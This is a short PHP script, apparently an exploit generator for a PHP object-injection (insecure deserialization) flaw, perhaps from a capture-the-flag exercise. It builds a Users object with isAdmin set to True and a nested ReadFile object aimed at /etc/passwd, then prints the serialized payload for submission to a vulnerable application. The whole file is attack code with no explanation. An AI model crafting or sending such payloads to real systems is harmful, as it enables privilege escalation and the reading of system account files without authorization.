<?php

class ReadFile{
      
      public function __construct(){
             $this->filename = "/etc/passwd";
      }
}


class Users{

     public function __construct(){
            $this->username = new ReadFile();
	    $this->isAdmin = True;
     }
     
}

$obj = new Users();

echo serialize($obj);
echo "\n";

?>
